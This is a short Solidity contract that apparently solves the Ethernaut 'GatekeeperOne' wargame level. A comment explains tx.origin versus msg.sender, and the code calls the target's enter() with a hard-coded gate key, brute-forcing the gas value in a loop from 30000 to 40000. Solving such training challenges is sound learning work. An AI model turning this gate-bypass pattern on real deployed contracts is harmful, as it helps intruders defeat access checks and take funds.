// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./hadcoins.sol";

// The tx.origin global variable refers to the original external
// account that started the transaction while msg.sender refers to the
// immediate account (it could be external or another contract account)
// that invokes the function. The tx.origin variable will always refer to
// the external account while msg.sender can be a contract or external account.
// If there are multiple function invocations on multiple contracts,
// tx.origin will always refer to the account that started the transaction
// irrespective of the stack of contracts invoked

contract Test {
    GatekeeperOne public gatekeeperOne;
    bytes8 private key = 0x100000000000f7c3;

    constructor(address addr) public {
        gatekeeperOne = GatekeeperOne(addr);
    }

    function forwardTransaction() public {
        for (uint256 i = 30000; i < 40000; ++i) {
            (bool sent, bytes memory data) = address(gatekeeperOne).call{
                gas: i
            }(abi.encodeWithSignature("enter(bytes8)", key));
        }
        // (bool sent, bytes memory data) = address(gatekeeperOne).call(
        //     abi.encodeWithSignature("enter(bytes8)", key));
    }

    function getSign() public view returns (bytes memory) {
        return abi.encodeWithSignature("enter(bytes8)", key);
    }
}
